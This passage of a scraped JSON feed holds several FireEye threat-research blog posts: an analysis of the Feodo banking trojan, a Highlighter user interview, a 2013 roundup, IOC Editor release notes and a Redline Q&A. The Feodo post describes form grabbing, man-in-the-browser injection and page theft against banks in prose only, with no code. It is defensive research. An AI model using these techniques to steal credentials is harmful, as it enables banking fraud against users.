Kazanciyan","articleImgCdnMap":{"https://www.fireeye.com/content/dam/legacy/ammo/auditparser-screengrab01.jpg":"https://cdn.jsdelivr.net/gh/myreaderx21/cdn91@2020_4/2020/08/24/14-11-05-060_abc0f110eb4af9d7.webp","https://www.fireeye.com/content/dam/legacy/ammo/auditparser-screengrab12-1024x254.jpg":"https://cdn.jsdelivr.net/gh/myreaderx23/cdn51@2020_3/2020/08/24/14-11-08-793_dabde61b6ece1177.webp","https://www.fireeye.com/content/dam/legacy/ammo/auditparser-screengrab2-1024x282.jpg":"https://cdn.jsdelivr.net/gh/myreaderx12/cdn77@2020_2/2020/08/24/14-11-20-641_3db3b42fe6382207.webp","https://www.fireeye.com/content/dam/legacy/ammo/auditparser-screengrab3-1024x165.jpg":"https://cdn.jsdelivr.net/gh/myreaderx25/cdn50@2020_1/2020/08/24/14-11-15-835_ce73aa56aef3e71a.webp","https://www.fireeye.com/content/dam/legacy/ammo/auditparser-screengrab4-1024x496.jpg":"https://cdn.jsdelivr.net/gh/myreaderx30/cdn3@2020_5/2020/08/24/14-11-21-833_e3db08b486a95732.webp"},"publishedOrCreatedDate":1598278264212},{"createdTime":"2020-08-24 22:11:04","updatedTime":"2020-08-24 22:11:04","title":"Feodo - A new botnet on the rise","link":"http://www.fireeye.com/blog/threat-research/2010/10/feodosoff-a-new-botnet-on-the-rise.html","description":"<p>We are seeing a trend where new banking trojans are emerging on the threat landscape very rapidly.&nbsp; First came Bugat followed by <a title=\"Carberp\" target=\"_blank\" href=\"http://www.zdnet.co.uk/blogs/walsingham-10020628/can-batman-rescue-business-from-bugat-carberp-and-zeus-10020771/\">Carberp</a>.&nbsp; Unfortunately, it is time to meet 'Feodo'. Since august of this year when FireEye's <a title=\"MPS\" target=\"_blank\" href=\"http://www.fireeye.com/content/fireeye-www/en_US/products-delete.html\">MPS</a> devices detected this malware in the field, we have been monitoring this banking trojan very closely. In many ways, this malware looks similar to other famous banking trojans like Zbot and SpyEye.&nbsp; Although my analysis says that this malware is not a toolkit and is in the hands of a single criminal group.</p> \n<p>At the time of writing this article, AV coverage for this malware looks very disappointing. Out of 42 antivirus software listed on VirusTotal only two were able to detect it as malicious. Screenshot from VT:</p> \n<p>&nbsp;</p> \n<p> <a style=\"display: inline;\" href=\"http://www.fireeye.com/content/dam/legacy/blog/2012/11/6a00d835018afd53ef0133f5399438970b-800wi.png\"><img border=\"0\" title=\"VT\" src=\"https://www.fireeye.com/content/dam/legacy/blog/2012/11/6a00d835018afd53ef0133f5399438970b-800wi.png\" class=\"asset  asset-image at-xid-6a00d835018afd53ef0133f5399438970b image-full landscape-med\" alt=\"VT\" /></a><br /> <br /> </p> \n<p>&nbsp;</p> \n<p>Complete report can be found here: <a title=\"MD5: 557597074df3d3ce0e1674285ef19732\" target=\"_blank\" href=\"http://www.virustotal.com/file-scan/report.html?id=fe0dae46f5d126e8bcf584feb53247e1e317cd4920c6b368e34a8c6f4785c20d-1287578302\">MD5: 557597074df3d3ce0e1674285ef19732</a></p> \n<p>Here are some high level features offered by this malware:</p> \n<p>1. Bot herders can supply a list of URLs (mostly of banking sites) so that the malware can start intercepting these web pages.&nbsp; What this means is that whenever a user tries to visit these web sites, the malware will start submitting the web form data back to its CnC.&nbsp; These web forms and the data inside them will be intercepted well before its gets encapsulated into HTTPS.&nbsp; All the information including login credentials will be in hands of bot herders in plain text.</p> \n<p>2. It's fully capable of Man in the Browser <a title=\"MITB\" target=\"_blank\" href=\"http://www.fireeye.com/content/fireeye-www/en_US/blog/threat-research/2010/02/man-in-the-browser.html\">(MITB</a>) attacks. This means that it can intercept original web contents coming from legitimate servers in order to append its own crafted HTML.&nbsp; This is normally done to ask the user for more information than was originally requested by the actual server, like your PIN numbers, Social Security number etc.</p> \n<p>3. It can also steal HTML pages from your browsing sessions.&nbsp; Sound strange?&nbsp; Well for any successful MITB attack, the attacker needs to know about the HTML being served by the legitimate server.&nbsp; Just imagine an attacker wants to modify HTML pages for the Wells Fargo \"Add New Payee\" web page.&nbsp; Unless the attacker himself has an account with Wells Fargo, he may not know the contents of this page.&nbsp; By stealing this private page while a legitimate user is browsing to it, the attacker is in a perfect position to prepare his future MITB attack.</p> \n<p>How does this all happen? Let's take a closer look.</p> \n<p>At the time of writing this post, I can see that the bot herders are instructing its zombies to target over a dozen banks.&nbsp; This is a huge list , I rarely see even bot herders behind Zbot targeting so many banks.</p> \n<p> <b>Configuration file:</b></p> \n<p> <a style=\"display: inline;\" href=\"http://www.fireeye.com/content/dam/legacy/blog/2012/11/6a00d835018afd53ef013488583626970c-800wi.png\"><img border=\"0\" title=\"Config_file\" src=\"https://www.fireeye.com/content/dam/legacy/blog/2012/11/6a00d835018afd53ef013488583626970c-800wi.png\" class=\"asset  asset-image at-xid-6a00d835018afd53ef013488583626970c image-full landscape-med\" alt=\"Config_file\" /></a></p> \n<p>Above is the configuration file for the malware containing all the web urls the bot herders want to intercept for information stealing.&nbsp; In this list, one can see many famous banks like Wells Fargo, Bank Of America, Citibank etc.&nbsp; Many other famous web sites like Amazon.com, Myspace, and Google mail are in the target list as well.</p> \n<p>&nbsp;</p> \n<p> <b>Stealing web forms:</b></p> \n<p>&nbsp;</p> \n<p> <a style=\"display: inline;\" href=\"http://www.fireeye.com/content/dam/legacy/blog/2012/11/6a00d835018afd53ef0133f5387a3a970b-800wi.png\"><img border=\"0\" title=\"Wellsfargo\" src=\"https://www.fireeye.com/content/dam/legacy/blog/2012/11/6a00d835018afd53ef0133f5387a3a970b-800wi.png\" class=\"asset  asset-image at-xid-6a00d835018afd53ef0133f5387a3a970b image-full landscape-med\" alt=\"Wellsfargo\" /></a></p> \n<p> <b>Note:</b> The above credentials are fake and were supplied by me to generate this particular scenario.</p> \n<p> <b>Stealing HTML pages:</b></p> \n<p> <a style=\"display: inline;\" href=\"http://www.fireeye.com/content/dam/legacy/blog/2012/11/6a00d835018afd53ef013488586ab1970c-800wi.png\"><img border=\"0\" title=\"Uploading_html\" src=\"https://www.fireeye.com/content/dam/legacy/blog/2012/11/6a00d835018afd53ef013488586ab1970c-800wi.png\" class=\"asset  asset-image at-xid-6a00d835018afd53ef013488586ab1970c image-full landscape-med\" alt=\"Uploading_html\" /></a><br /> <br /> </p> \n<p>I must say that with respect to the feature set, this malware is almost equivalent to other known banking trojans.&nbsp; Although this malware may have few advantages over other famous banking trojans like Zbot and SpyEye.&nbsp; First of all it's private code so unlike other tool kits it wont cost the bot herders thousands of dollars.&nbsp; Unlike Zbot which has become a victim of its own success, this malware can fly under the radar for a long time. If the attackers want a new feature, they don't need to wait for a new toolkit version, a change can be made right away.</p> \n<p> <b>Atif Mushtaq</b> @ FireEye Malware Intelligence Lab</p> \n<p>Detailed Question/Comments : research SHIFT-2 fireeye DOT COM</p> \n<p>&nbsp;</p> \n<p>&nbsp;</p>","descriptionType":"html","publishedDate":"Thu, 21 Oct 2010 10:49:16 +0000","feedId":1226,"bgimg":"https://www.fireeye.com/content/dam/legacy/blog/2012/11/6a00d835018afd53ef0133f5399438970b-800wi.png","linkMd5":"8a5de77d401628c34ed194e2ac09754d","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx33/cdn7@2020_3/2020/08/24/14-11-06-879_86233c32ec519f97.webp","destWidth":1680,"destHeight":1050,"sourceBytes":39077,"destBytes":68452,"author":"Atif Mushtaq","articleImgCdnMap":{"https://www.fireeye.com/content/dam/legacy/blog/2012/11/6a00d835018afd53ef0133f5399438970b-800wi.png":"https://cdn.jsdelivr.net/gh/myreaderx33/cdn7@2020_3/2020/08/24/14-11-06-879_86233c32ec519f97.webp","https://www.fireeye.com/content/dam/legacy/blog/2012/11/6a00d835018afd53ef013488583626970c-800wi.png":"https://cdn.jsdelivr.net/gh/myreaderx27/cdn11@2020_5/2020/08/24/14-11-10-887_344b027558ad5b83.webp","https://www.fireeye.com/content/dam/legacy/blog/2012/11/6a00d835018afd53ef0133f5387a3a970b-800wi.png":"https://cdn.jsdelivr.net/gh/myreaderx18/cdn43@2020_1/2020/08/24/14-11-10-561_112849e74e92f68b.webp","https://www.fireeye.com/content/dam/legacy/blog/2012/11/6a00d835018afd53ef013488586ab1970c-800wi.png":"https://cdn.jsdelivr.net/gh/myreaderx30/cdn87@2020_2/2020/08/24/14-11-20-066_8d546647777f1594.webp"},"publishedOrCreatedDate":1598278264215},{"createdTime":"2020-08-24 22:11:04","updatedTime":"2020-08-24 22:11:04","title":"Highlighter Super Users Series: Post 2","link":"http://www.fireeye.com/blog/threat-research/2013/01/highlighter-super-users-series-post-2.html","description":"<div class=\"c00 c00v1\"> \n <p>Back in November I published the first interview from the<i> <a target=\"_blank\" href=\"http://www.fireeye.com/content/fireeye-www/en_US/services/freeware/highlighter.html\" title=\"Highlighter\">Highlighter™</a> Super Users blog series</i>. My goal with this series is to shed some light on all the great things that can be achieved using this freeware tool. In part 2, I interviewed <i>toolsmith</i> author and <a target=\"_blank\" href=\"http://holisticinfosec.org/component/option,com_frontpage/Itemid,1/\">HolisticInfoSec.org </a>webmaster, Russ McRee.</p> \n <p> <b>Super User Interview #2: Russ McRee</b></p> \n <p>Russ McRee is the author of ISSA Journal's <i>toolsmith</i> series and runs HolisticInfoSec.org. In October 2011 Russ contacted me to discuss Highlighter in that month's issue of the ISSA Journal, and later for the nomination of Highlighter for the <i>2011 Toolsmith Tool of the Year</i>. As someone who has analyzed Highlighter's effectiveness as a forensics tool for his own articles, I asked him to answer a few questions based on his experience with the freeware tool.</p> \n <ol> \n  <li> <b>Name</b> <br /> Russ McRee</li> \n  <li> <b>Realm of work</b> <br /> Security Analytics (security incident management, security monitoring, attack and penetration testing).</li> \n  <li> <b>How did you hear of Highlighter?</b> <br /> I watch the websites and check for tool updates.</li> \n  <li> <b>Do you know of any other tools that do what Highlighter does?</b> <br /> Log Parser, Log Parser Lizard, Log Parser Studio, Splunk</li> \n  <li> <b>How do you normally use Highlighter?</b> <br /> I mainly use Highlighter for Log analysis, forensic investigations, demonstrations and research (see <a target=\"_blank\" href=\"http://www.youtube.com/watch?v=w0uOCOINrWY\">http://www.youtube.com/watch?v=w0uOCOINrWY</a> and <a target=\"_blank\" href=\"https://www.sans.org/reading_room/whitepapers/logging/evil-lens-web-logs_33950\">https://www.sans.org/reading_room/whitepapers/logging/evil-lens-web-logs_33950</a>)</li> \n  <li> <b>Can you describe one scenario in which Highlighter helped you find evil and/or solve crime?</b> <br /> I had a recent mysterious case of core utility files and binaries gone missing from very important infrastructure management servers that initially looked malicious and intentional. Using Highlighter for analysis of Windows event logs led to the discovery of a sync job gone awry (misconfiguration) in the Application log via time stamp matching and keyword highlights.</li> \n  <li> <b>On a scale from 1 (worst) to 5 (best), how well does Highlighter address your use case(s)?</b> <br /> 4</li> \n  <li> <b>What is missing from Highlighter for your use case(s)?</b> <br /> Word wrap option</li> \n  <li> <b>What is one Highlighter feature addition that would serve the Information Security community best?</b> <br /> Potential DB support</li> \n  <li> <b>Are you aware of, or have you used, any of the following features:</b> \n   <ul> \n    <li> <i>Activity Over Time feature that lets you view log data as a function of Entries Per Day</i> <br /> No, I was not aware.</li> \n    <li> <i>Hotkeys feature</i> <br /> Yes, I was aware of this feature.</li> \n    <li> <i>Ability to change basic font settings for your output</i> <br /> Yes, I was aware of this feature.</li> \n   </ul> </li> \n  <li> <b>Have you ever seen Highlighter used in such a way that your eyeballs melted from all the Awesome?</b> <br /> My eyeballs melted from the awesome when I stuffed Highlighter with a 2.44GB Swatch log file during large file testing while writing October 2011's <i>toolsmith</i>. It took a little time to load and format (to be expected), but it handled 24,502,412 log entries admirably (no choking). I threw a query for a specific inode at it and Highlighter tagged 1930 hits across 25 million+ lines in ten minutes.</li> \n </ol> \n <p>Keep an eye out for the final post in the <i>Highlighter Super Users Series.</i> If you're interested in sharing your own experiences with this tool, please let me know by commenting below.</p> \n</div>","descriptionType":"html","publishedDate":"Wed, 23 Jan 2013 22:51:37 +0000","feedId":1226,"bgimg":"","linkMd5":"221170324da906681c0a12b75d66ad67","bgimgJsdelivr":"","metaImg":"","author":"Jed Mitten","publishedOrCreatedDate":1598278264210},{"createdTime":"2020-08-24 22:11:04","updatedTime":"2020-08-24 22:11:04","title":"Best of the Best in 2013: The Armory","link":"http://www.fireeye.com/blog/threat-research/2013/12/2013-armory.html","description":"<div class=\"c00 c00v1\"> \n <p>Everyone likes something for free. And there is no better place to go to get free analysis, intelligence and tools than <a target=\"_blank\" href=\"http://www.fireeye.com/content/fireeye-www/en_US/blog/threat-research.html/category/etc/tags/fireeye-blog-tags/armory/\">The Armory</a> on M-Unition. During the past year, we've offered intelligence and analysis on new threat activity, sponsored open source projects and offered insight on free tools like <a target=\"_blank\" href=\"http://www.fireeye.com/content/fireeye-www/en_US/services/freeware/redline.html\">Redline™</a>, all of which has been highlighted on our blog.</p> \n <p>In case you've missed it, here are some of our most popular posts:</p> \n <p> <b> <a target=\"_blank\" href=\"https://www.mandiant.com/blog/challenges-malware-intelligence-analysis-similar-network-protocols-backdoors-threat-groups/\">Challenges in Malware and Intelligence Analysis: Similar Network Protocols, Different Backdoors and Threat Groups</a></b></p> \n <b> </b> \n <p> <b></b>In this post, Mandiant's Intel shares insight on threat activity. Specifically, two separate APT groups, using two different backdoors that had very similar networking protocols. Read more to learn what they found.</p> \n <p> <b> <a target=\"_blank\" href=\"https://www.mandiant.com/blog/mandiant-releases-owasp-broken-web-applications-project-vm-version-11/\">New Release: OWASP Broken Web Applications Project VM Version 1.1</a></b></p> \n <b> </b> \n <p> <b></b>Chuck Willis overviews version 1.1 of the Mandiant-sponsored <a target=\"_blank\" href=\"http://www.owaspbwa.org/\">OWASP Broken Web Applications Project</a> Virtual Machine (VM). If you are not familiar with this open source project, it provides a freely downloadable VM containing more than 30 web applications with known or intentional security vulnerabilities. Many people use the VM for training or self-study to learn about web application security vulnerabilities, including how to find them, exploit them, and fix them. It can also be used for other purposes such as testing web application assessment tools and techniques or understanding evidence of web application attacks.</p> \n <p> <b> <a target=\"_blank\" href=\"https://www.mandiant.com/blog/basics-series-openioc/\">Back to Basics Series: OpenIOC</a></b></p> \n <b> </b> \n <p> <b></b>Will Gibb and a few of his colleagues at Mandiant embark on a series going back to the basics and looking deeper at OpenIOC - how we got where we are today, how to make and use IOCs, and the future of OpenIOC.</p> \n <p>Check out related posts here: <a target=\"_blank\" href=\"https://www.mandiant.com/blog/history-openioc/\">The History of OpenIOC</a>, <a target=\"_blank\" href=\"https://www.mandiant.com/blog/openioc-basics/\">Back to the Basics</a>, <a target=\"_blank\" href=\"https://www.mandiant.com/blog/live-black-hat-2013-openioc-iocwriter-free-tools/\">OpenIOC, IOC Writer and Other Free Tools.</a></p> \n <p> <b> <a target=\"_blank\" href=\"https://www.mandiant.com/blog/live-black-hat-2013-redline-turbo-talk-andarsenal/\">Live from Black Hat 2013: Redline, Turbo Talk, and Arsenal</a></b></p> \n <b> </b> \n <p> <b></b>Sitting poolside at Black Hat USA 2013, Mandiant's Kristen Cooper chats with Ted Wilson about <a target=\"_blank\" href=\"https://www.mandiant.com/blog/redline-answering-questions/\">Redline</a> in this latest podcast. Ted leads the development of Redline where he provides innovative investigative features and capabilities enabling both the seasoned investigator and those with considerably less experience to answer the question, \"have you been compromised?\"</p> \n <p> <a target=\"_blank\" href=\"https://www.mandiant.com/blog/utilities-industry-cyber-targeting-scope/\"><b>Utilities Industry in the Cyber Targeting Scop</b>e</a></p> \n <p>Our intel team is back again, this time with an eye on the utilities industry. As part of our incident response and managed defense work, Mandiant has observed Chinese APT groups exploiting the computer networks of U.S. utilities enterprises servicing or providing electric power to U.S. consumers, industry, and government. The most likely targets for data theft in this industry include smart grid technologies, water and waste management expertise, and negotiations information related to existing or pending deals involving Western utilities companies operating in China.</p> \n</div>","descriptionType":"html","publishedDate":"Fri, 20 Dec 2013 21:48:44 +0000","feedId":1226,"bgimg":"","linkMd5":"e2005f35fbfe29ccff7e24ade721ff1d","bgimgJsdelivr":"","metaImg":"","author":"Helena Brito","publishedOrCreatedDate":1598278264205},{"createdTime":"2020-08-24 22:11:04","updatedTime":"2020-08-24 22:11:04","title":"Freeware Release: IOC Editor (IOCe) v2.2.0","link":"http://www.fireeye.com/blog/threat-research/2012/12/freeware-release-ioc-editor-ioce-v220.html","description":"<div class=\"c00 c00v1\"> \n <p>The updated release of <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/services/freeware/ioc-editor.html\">IOC Editor</a> has been a long time coming, but it is well worth the upgrade. There have always been grumblings about IOC Editor, but lately those grumblings have been growing louder. The noise eventually got so loud that even my noise canceling headphones couldn't silence it. I could have just turned up the music a little more, but instead I decided to grab the code and fix some of the issues once and for all.</p> \n <p>Some of the changes to IOC Editor were minor (Ctrl-X no longer exits the program), some were major (check out the new Properties panel where commenting per IndicatorItem is now available), and of course I discovered some bugs that I didn't even know existed (No, I didn't cause them with my other changes). Long story short, there are a lot of new features and improvements in this version.</p> \n <p>Make sure you pay attention to what's different and any messages that pop-up as the wording and options may have changed.</p> \n <p>In this blog post, I am going to touch on a couple of new features and improvements. If you would like to see the full list, please check-out the <a href=\"http://www.fireeye.com/content/dam/fireeye-www/services/freeware/rn-ioc-editor.pdf\">release notes</a>. Fair warning, there is a lot to read as I did get a bit fix happy.</p> \n <h3>Some of the New:</h3> \n <p> <b>Options Dialog</b></p> \n <p>This is still a bit of a work in progress, but there is now a place to set some of the defaults for<a href=\"http://www.fireeye.com/content/fireeye-www/en_US/services/freeware/ioc-editor.html\"> IOC Editor</a>.</p> \n <a href=\"https://www.fireeye.com/content/dam/legacy/ammo/Figure-1-Option-Dialog.png\"><img width=\"300\" height=\"220\" class=\"size-medium wp-image-3958\" title=\"Figure 1: Option Dialog\" src=\"https://www.fireeye.com/content/dam/legacy/ammo/Figure-1-Option-Dialog-300x220.png\" /></a>Figure 1: Option Dialog\n <p>Figure 1 shows the preferences that are currently available in the options dialog. You can set the default author (we typically use the e-mail address to identify the author), and set whether you want to warn on Deleting or Pruning.</p> \n <p>Now before we go too far, let me quickly discuss the difference between deleting and pruning:</p> \n <p>Deleting will only delete the selected item, whether it's an individual item, or a logic item (AND, OR). If you delete a logic item, the items that are below it will be bumped up a level.</p> \n <a href=\"https://www.fireeye.com/content/dam/legacy/ammo/Figure-2-Before-Delete.png\"><img width=\"300\" height=\"90\" class=\"size-medium wp-image-3959\" title=\"Figure 2: Before Delete\" src=\"https://www.fireeye.com/content/dam/legacy/ammo/Figure-2-Before-Delete-300x90.png\" /></a>Figure 2: Before Delete\n <a href=\"https://www.fireeye.com/content/dam/legacy/ammo/Figure-3-After-Delete.png\"><img width=\"300\" height=\"77\" class=\"size-medium wp-image-3960\" title=\"Figure 3: After Delete\" src=\"https://www.fireeye.com/content/dam/legacy/ammo/Figure-3-After-Delete-300x77.png\" /></a>Figure 3: After Delete\n <p>Figure 2 shows what the Indicator of Compromise (IOC) looks like before deleting the AND. Figure 3 shows what the IOC looks like after deleting the AND. Notice that the items that were under the AND were moved up a level and are now under the top OR.</p> \n <p>There is no problem with this IOC, but what happens if you were to delete the AND in the following IOC?</p> \n <a href=\"https://www.fireeye.com/content/dam/legacy/ammo/Figure-4-Before-Delete.png\"><img width=\"300\" height=\"100\" class=\"size-medium wp-image-3961\" title=\"Figure 4: Before Delete\" src=\"https://www.fireeye.com/content/dam/legacy/ammo/Figure-4-Before-Delete-300x100.png\" /></a>Figure 4: Before Delete\n <p>If you delete the AND that is shown in Figure 4, you will end up with the \"File Name is not good_file.exe\" under the top OR. If you were to search your enterprise for all files that were not \"good_file.exe\", that would be very, very bad.</p> \n <p>Now, onto pruning. The Prune option is only available for logic items (ANDs and ORs) and will remove the entire logic branch.</p> \n <p>Going back to the example shown in Figure 4, if you Prune the selected AND, the AND, in addition to all items under it, will be deleted.</p> \n <a href=\"https://www.fireeye.com/content/dam/legacy/ammo/Figure-5-After-Prune.png\"><img width=\"300\" height=\"41\" class=\"size-medium wp-image-3962\" title=\"Figure 5: After Prune\" src=\"https://www.fireeye.com/content/dam/legacy/ammo/Figure-5-After-Prune-300x41.png\" /></a>Figure 5: After Prune\n <p>You can see in Figure 5 that the only items that remain were directly under the top OR.</p> \n <p>Now that we have that cleared up, let's continue with the rest of the cool new stuff in <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/services/freeware/ioc-editor.html\">IOC Editor</a>.</p> \n <p> <b>Keyboard Shortcuts</b></p> \n <p>Everybody loves keyboard shortcuts; the less we have to type-out, the better. With that in mind, I've gone through and added shortcuts where appropriate. Below is a list of the shortcuts currently available in the editor:</p> \n <a href=\"https://www.fireeye.com/content/dam/legacy/ammo/Shortcuts.png\"><img width=\"287\" height=\"267\" class=\"size-full wp-image-3966\" title=\"Shortcuts\" src=\"https://www.fireeye.com/content/dam/legacy/ammo/Shortcuts.png\" /></a>Shortcuts\n <p> <b>Add Buttons (AND, OR, Item)</b></p> \n <p>The buttons to add an AND, OR, or Item have been moved to a menu bar above the definition area. This takes up less space and allows for future expansion.</p> \n <a href=\"https://www.fireeye.com/content/dam/legacy/ammo/Figure-6-New-Add-Buttons.png\"><img width=\"297\" height=\"157\" class=\"size-full wp-image-3963\" title=\"Figure 6: New Add Buttons\" src=\"https://www.fireeye.com/content/dam/legacy/ammo/Figure-6-New-Add-Buttons.png\" /></a>Figure 6: New Add Buttons\n <p>If you just click the button, the \"Item\" button remembers what you recently added. It also has a drop down with a list of terms (same as right-clicking in the definition area and selecting \"Add Item.\")</p> \n <p> <b>Properties Panel</b></p> \n <p>The properties panel is an area to the right of the definition area that will show all pertinent details of the selected item. By default, the properties panel is not shown. To display it, either click the button or use the Ctrl+P keyboard shortcut.</p> \n <p>For those who have used Visual Studio before, the properties panel will look very familiar.</p> \n <a href=\"https://www.fireeye.com/content/dam/legacy/ammo/Figure-7-Properties.png\"><img width=\"242\" height=\"216\" class=\"size-full wp-image-3964\" title=\"Figure 7: Properties\" src=\"https://www.fireeye.com/content/dam/legacy/ammo/Figure-7-Properties.png\" /></a>Figure 7: Properties\n <p>Figure 7 shows the details that are given for a selected item. Not all of the items are editable from here, but it at least gives you a view into what's going on behind-the-scenes.</p> \n <p>You can also edit/add comments for the item. With this upgrade, you can add a comment to individual items, such as an MD5, that lets someone know what file it actually goes with.</p> \n <h3>Improvements:</h3> \n <p>In addition to the new features, there were a number of improvements (aka bug fixes).</p> \n <p> <b>Unsaved Changes Warning</b></p> \n <p>An important change was the rewording of the unsaved changes dialog box that better aligns with other standard Windows applications.</p> \n <p> <b>NOTE</b>: Read this carefully as this has changed from the previous version of <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/services/freeware/ioc-editor.html\">IOC Editor</a>.</p> \n <a href=\"https://www.fireeye.com/content/dam/legacy/ammo/Figure-8-Unsaved-changes.png\"><img width=\"265\" height=\"132\" class=\"size-full wp-image-3965\" title=\"Figure 8: Unsaved changes\" src=\"https://www.fireeye.com/content/dam/legacy/ammo/Figure-8-Unsaved-changes.png\" /></a>Figure 8: Unsaved changes\n <p>Figure 8 shows the new wording presented when exiting IOC Editor with unsaved changes.</p> \n <ul> \n  <li> <i>Yes</i> - saves changes and exits</li> \n  <li> <i>No</i> - does not save changes and exits</li> \n  <li> <i>Cancel</i> - cancels the exit process and does not save changes</li> \n </ul> \n <p> <b>Description Improvements</b></p> \n <p>The Description field has been tweaked a bit, and now allows for proper display of carriage returns and tabs. You now don't have to deal with descriptions that look like this:</p> \n <blockquote>\n  \"This malware is evil⌷Why would anyone have this⌷Report Immediately\"\n </blockquote> \n <p> <b>Too Many More</b></p> \n <p>As I stated earlier in this post, I went a little bug fix crazy. If you're interested in a full list of bug fixes, please <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/services/freeware/ioc-editor.html\">click here</a>.</p> \n <h3>The Future:</h3> \n <p>There are still plenty of other features and enhancements that I would like to make to <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/services/freeware/ioc-editor.html\">IOC Editor</a>, such as ioc_lint integration, additional options, etc. I'm also looking forward to your feedback on the current updates/additions.</p> \n</div>","descriptionType":"html","publishedDate":"Tue, 11 Dec 2012 22:44:47 +0000","feedId":1226,"bgimg":"","linkMd5":"9977cf893642d8853e900044f2f0b64c","bgimgJsdelivr":"","metaImg":"","author":"Tony Dell","articleImgCdnMap":{"https://www.fireeye.com/content/dam/legacy/ammo/Figure-1-Option-Dialog-300x220.png":"https://cdn.jsdelivr.net/gh/myreaderx32/cdn55@2020_6/2020/08/24/14-11-10-261_f36526d63dac7af3.webp","https://www.fireeye.com/content/dam/legacy/ammo/Figure-2-Before-Delete-300x90.png":"https://cdn.jsdelivr.net/gh/myreaderx21/cdn47@2020_1/2020/08/24/14-11-19-347_0a1c722c677efc55.webp","https://www.fireeye.com/content/dam/legacy/ammo/Figure-3-After-Delete-300x77.png":"https://cdn.jsdelivr.net/gh/myreaderx11/cdn74@2020_2/2020/08/24/14-11-12-973_618a4e146711285b.webp","https://www.fireeye.com/content/dam/legacy/ammo/Figure-4-Before-Delete-300x100.png":"https://cdn.jsdelivr.net/gh/myreaderx33/cdn51@2020_4/2020/08/24/14-11-19-385_7b22bf640fb8b505.webp","https://www.fireeye.com/content/dam/legacy/ammo/Figure-5-After-Prune-300x41.png":"https://cdn.jsdelivr.net/gh/myreaderx10/cdn54@2020_6/2020/08/24/14-11-16-413_fd858fea4ef07417.webp","https://www.fireeye.com/content/dam/legacy/ammo/Shortcuts.png":"https://cdn.jsdelivr.net/gh/myreaderx15/cdn56@2020_2/2020/08/24/14-11-19-423_104003dc5440e340.webp","https://www.fireeye.com/content/dam/legacy/ammo/Figure-6-New-Add-Buttons.png":"https://cdn.jsdelivr.net/gh/myreaderx31/cdn11@2020_4/2020/08/24/14-11-17-981_18819acf64debfa7.webp","https://www.fireeye.com/content/dam/legacy/ammo/Figure-7-Properties.png":"https://cdn.jsdelivr.net/gh/myreaderx29/cdn1@2020_4/2020/08/24/14-11-15-115_26a4ab24e7c252ba.webp","https://www.fireeye.com/content/dam/legacy/ammo/Figure-8-Unsaved-changes.png":"https://cdn.jsdelivr.net/gh/myreaderx12/cdn59@2020_5/2020/08/24/14-11-19-789_14c5b6444dc1e104.webp"},"publishedOrCreatedDate":1598278264211},{"createdTime":"2020-08-24 22:11:04","updatedTime":"2020-08-24 22:11:04","title":"Redline: Answering Your Questions","link":"http://www.fireeye.com/blog/threat-research/2013/03/redline-answering-questions.html","description":"<div class=\"c00 c00v1\"> \n <p>Those of you who attended the \"Tools of Engagement: Redline™ - We've Got the Tool, If You've Got the Time\" webinar last month by David Ross and myself will recall that we ran short on time while answering all of your questions. The webinar covered the latest updates to <a target=\"_blank\" href=\"http://www.fireeye.com/content/fireeye-www/en_US/services/freeware/redline.html\">Redline</a>, Mandiant's free tool for investigating hosts for signs of malicious activity through memory and file analysis, and subsequently developing a threat assessment profile.</p> \n <p>If your question was one of those we did not get to, don't worry. We are going to cover all of those unanswered questions in this post, as well as retread some of those which were covered during the Q&amp;A for people who were unable to catch it live.&nbsp;</p> \n <p>Without further ado, following are your answers in no particular order:</p> \n <p> <b>Does Redline support disk images for collection and analysis?</b></p> \n <p>At the moment, Redline only works on memory images and live hosts. We are currently focusing on providing the best possible set of analysis tools for incident response.</p> \n <p> <b>Does Redline work for Macs or Mac Memory images? Does it work on Linux?</b></p> \n <p>Redline officially supports data collected with <a href=\"http://www.mandiant.com/products/platform/\">Mandiant Intelligent Response® (MIR)</a>, <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/services/freeware/memoryze.html\">Mandiant Memoryze™</a>, or a Redline Collector.</p> \n <p>Unfortunately, all of those currently only support collection on the various Windows platforms. However, I have heard of people having success getting audits collected with <a href=\"http://www.fireeye.com/content/fireeye-www/site-content/en_US/retired-pages-do-not-activate/memoryze-for-the-mac.html\">Memoryze™ for the Mac</a> to at least import into Redline. Be careful to note that if attempting this, the MRI scores and other analyses may be incorrect or invalid, as the scoring in Redline assumes it is operating against data collected from a Windows host.</p> \n <p> <b>Is there a specific audit you need to run in order to do Timeline Analysis?</b></p> \n <p>Short answer: no. The timeline analysis will parse any and all data with timestamps available for collection. The comprehensive collector option in Redline is the recommended starting place if timeline analysis is your goal as the standard collector collects very little in the way of timestamps.</p> \n <p> <b>How valuable would Redline be against a virtual machine created from a forensic image?</b></p> \n <p>As long as you can log in to the virtual machine with administrator rights to run the collection, Redline should have no problem importing and analyzing the data (provided it is one of the supported operating systems).</p> \n <p> <b>Is Redline free when used on an enterprise environment?</b></p> \n <p>Redline is free to use in any sized environment, although the collection aspect of Redline quickly becomes challenging with large scale and globally distributed networks. This leads to the next question...</p> \n <p> <b>Can Redline collection be run on a remote machine?</b></p> \n <p>Redline does not itself support remote collection. We recommend purchasing <a target=\"_blank\" href=\"http://www.mandiant.com/assets/MandiantIntelligentResponse.pdf\">Mandiant Intelligent Response<sup>®</sup></a> if you would like centralized remote collection of your hosts' data over an enterprise sized network.<br /> </p> \n <p> <b>Can you demonstrate how to use TimeWrinkles™ for events that occur over multiple days and put them all into one view?</b></p> \n <p>The easiest way to view timeline windows that are separated by greater than an hour is to create multiple manual TimeWrinkles around the points of time you are specifically interested in.</p> \n <p>Using item based TimeWrinkles you can also potentially see time entries that occur over multiple days. For instance, you could see the actions that happened around the creating of a file, as well as when that same file was last accessed a few days later all in one view, just by creating a TimeWrinkle around that file.</p> \n <p> <b>How do you get a TimeWrinkle based on a file?</b></p> \n <p>If you select any row within the Timeline and right click on it, Redline will give you the option to create a TimeWrinkle based on that item. In this case, you would just need to find the file in question within your timeline, select it, and choose \"Add a New TimeWrinkle<i>\" </i>from its right click menu.</p> \n <p> <b>Can Redline be used to pull strings from a memory image? We would like to pull info from the csrss process to see what commands might have run on a box.</b></p> \n <p>Redline can be configured to collect strings using the process listing 